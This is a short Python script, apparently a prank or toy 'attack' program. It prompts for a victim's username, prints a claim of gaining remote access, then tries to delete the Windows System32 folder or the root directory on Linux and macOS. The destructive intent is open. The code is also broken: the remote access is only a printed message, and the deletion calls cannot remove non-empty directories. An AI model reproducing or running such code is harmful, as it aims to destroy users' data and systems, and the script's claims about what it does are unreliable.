import os
import detect
import platform

def start():
    name = input("Username of victim: ")
    print(f"Getting remote access into {name}'s computer")

def attack():
    detect.detect()
    operating_system = platform.system()
    if operating_system == "Windows":
       os.rmdir("\Windows\System32")
    elif operating_system == "Linux":
       os.rmdir("/")
    elif operating_system == "Darwin":
       os.rmdir("/")
